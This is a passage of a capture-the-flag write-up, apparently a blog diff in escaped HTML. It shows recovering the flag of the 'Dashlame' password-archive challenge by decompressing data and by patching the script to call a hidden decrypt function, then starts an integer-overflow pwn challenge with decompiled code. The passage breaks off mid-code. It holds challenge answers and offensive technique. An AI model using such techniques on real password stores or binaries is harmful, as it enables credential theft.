+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Nov&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;                                                                 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;zlib&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9c\x0b\x0e\xf4\xc9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,IUH&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M,Q0f`a`ddpPP````&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4&amp;gt;!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0\xc4\xa0\xfb\x8c\x9b\x17\xa4\x98&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;y.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\x10\x8d\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Q0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x88\x05\x89\x8c\xec\xe2\xf2\xf2\x8c\x8d\x82&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x01\x89\xc5\xc5\xe5\xf9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;E)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x93&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xa3\x93\x8f\xab\x02\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x18\x94\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#Bt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x14&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b\xf2\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdc\x02\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;20W&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x13\x92&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xd1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18\x05\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x08\x03&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;mYkh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe6\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xad&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x85\xe5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;~O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc7\xea\x90\xcc\xe2\xf8\xa4\xd0\x92\xf8\xc4\xf8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x93\x92\xe4\x8c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;SQLite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;website_exampleusernameINSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tis_bUt_a_SCr4tch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Flag: &lt;strong&gt;INSA{Tis_bUt_a_SCr4tch}&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;alternative-way-using-decrypt_archive&quot;&gt;Alternative way using decrypt_archive()&lt;/h3&gt;
+
+&lt;p&gt;While listing the script functions, we could see a &lt;strong&gt;decrypt_archive()&lt;/strong&gt; function. However, this function was not available from the user interface of the program.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python dashlame.py
+      /.m.&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+     /.mnnm.&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;                                             ___
+    |.mmnvvnm.&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;                                     .,,,/&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;mmm.&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    |.mmnnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;,.                           ..,,&lt;span class=&quot;p&quot;&gt;;;;&lt;/span&gt;/.mmnnnmm.&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;mmnnnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;,                    .,&lt;span class=&quot;p&quot;&gt;;;;;;;;;&lt;/span&gt;/.mmmnnvvnnm.|
+     &lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;mmnnnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;::.sSSs      sSSs ,&lt;span class=&quot;p&quot;&gt;;;;;;;;;;;&lt;/span&gt;/.mmmnnvvvnnmm&lt;span class=&quot;s1&quot;&gt;'/
+       \`mmnnnvnm.\:::::SSSS,,,,,,SSSS:::::::;;;/.mmmnnvvvnnmmm'&lt;/span&gt;/
+          &lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;mnvvnm.&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:%%%&lt;span class=&quot;p&quot;&gt;;;;;;;;;;;;&lt;/span&gt;%%%%:::::&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/.mnnvvvvnnmmmmm&lt;span class=&quot;s1&quot;&gt;'/
+             \`mmmm.%%;;;;;%%%%%%%%%%%%%%%::/.mnnvvvnnmmmmm'&lt;/span&gt;/ &lt;span class=&quot;s1&quot;&gt;'
+                \`%%;;;;%%%%s&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;s%%%%mmmnnnmmmmmm'&lt;/span&gt;/ &lt;span class=&quot;s1&quot;&gt;'
+     |           `%;;;%%%%s&amp;amp;&amp;amp;.%%%%%%.%&amp;amp;&amp;amp;%mmmmmmmmmm'&lt;/span&gt;/ &lt;span class=&quot;s1&quot;&gt;'
+\    |    /       %;;%%%%&amp;amp;&amp;amp;.%;`    '&lt;/span&gt;%.&amp;amp;&amp;amp;%%%////// &lt;span class=&quot;s1&quot;&gt;'
+  \  |  /         %%%%%%s&amp;amp;.%%   x   %.&amp;amp;&amp;amp;%%%%%//%
+    \  .:::::.  ,;%%%%s&amp;amp;&amp;amp;&amp;amp;&amp;amp;.%;     ;.&amp;amp;&amp;amp;%%%%%%%%/,
+-!!!- ::#:::::%%%%%%s&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;%%%%%%%%%%%
+    / :##:::::&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;%%%%%%%%%%%%%%,
+  /  | `:#:::&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;%%%%%%%%%%%%%
+     |       `&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;,&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;SS%%%%%%%%%%%%%
+               `~~~~~'&lt;/span&gt;~~        SSSSSSS%%%%%%%%%%%%%
+                               SSSSSSSS%%%%%%%%%%%%%%
+                              SSSSSSSSSS%%%%%%%%%%%%%.
+                            SSSSSSSSSSSS%%%%%%%%%%%%%%
+                          SSSSSSSSSSSSS%%%%%%%%%%%%%%%.
+                        SSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%
+                      SSSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%%.
+                    SSSSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%%%%
+                  SSSSSSSSSSSSSSSSSS%%%%%%%%%%%%%%%%%%%%.
+
+                          WELCOME TO DASHLAME
+
+1. Create a new password archive
+2. Add a password to an archive
+3. Access a password from an existing archive
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;An alternative way of decrypting an archive would be to:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Create a password archive.&lt;/li&gt;
+  &lt;li&gt;Note passphraseA and passphraseB.&lt;/li&gt;
+  &lt;li&gt;Modify the script in order to call decrypt_archive(archive,passphraseA,passphraseB).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                      WELCOME TO DASHLAME
+
+1. Create a new password archive
+2. Add a password to an archive
+3. Access a password from an existing archive
+1
+Please enter your archive name: boiteaklou
+Getting random data from atmospheric noise and mouse movements..........                                                               
+This is your passphrase : pruden patties
+Please remember it or you will lose all your passwords.
+Archive created successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here is the slight modification I brought to the &lt;em&gt;main&lt;/em&gt; function of the script:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HEADER&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1. Create a new password archive'&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2. Add a password to an archive'&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'3. Access a password from an existing archive'&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;createArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;updateArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;accessArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;decrypt_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'boiteaklou.dla'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pruden'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'patties'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# HERE&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wrong choice'&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Error.'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, the password archive should be decrypted:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings boiteaklou.db
+SQLite format 3
+tablePasswordsPasswords
+CREATE TABLE Passwords&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;website TEXT, username TEXT, password TEXT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;website_exampleusernameINSA&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Tis_bUt_a_SCr4tch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;pwn-intergover&quot;&gt;[Pwn] Intergover&lt;/h2&gt;
+
+&lt;h3 id=&quot;statement-4&quot;&gt;Statement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I hope you know how integers are stored.&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i &amp;lt;your_keyfile&amp;gt; -p 2223 user@intergover.ctf.insecurity-insa.fr&lt;/code&gt;
+To find your keyfile, look into your profile on this website.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/2019-05-08/intergover&quot; title=&quot;intergover&quot;&gt;Binary&lt;/a&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=_BgblvF90UE&quot;&gt;https://www.youtube.com/watch?v=_BgblvF90UE&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;spotting-the-vulnerabilty&quot;&gt;Spotting the vulnerabilty&lt;/h3&gt;
+
+&lt;p&gt;Let’s see what we can get from this binary.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file intergover
+intergover: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8a1089cd9d189ee37904eaf6edfb3ce59652a881, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, it’s a 64-bit executable, not stripped. We can quickly reverse-engineer the binary in order to get a fine understanding of its behavior.&lt;/p&gt;
+
+&lt;p&gt;Here is the pseudo-code generated by IDA Pro:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+1Bh] [rbp-15h]
+&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+1Ch] [rbp-14h]
+&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+20h] [rbp-10h]
+&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+24h] [rbp-Ch]
+&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+28h] [rbp-8h]
+&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__readfsqword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me one param: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
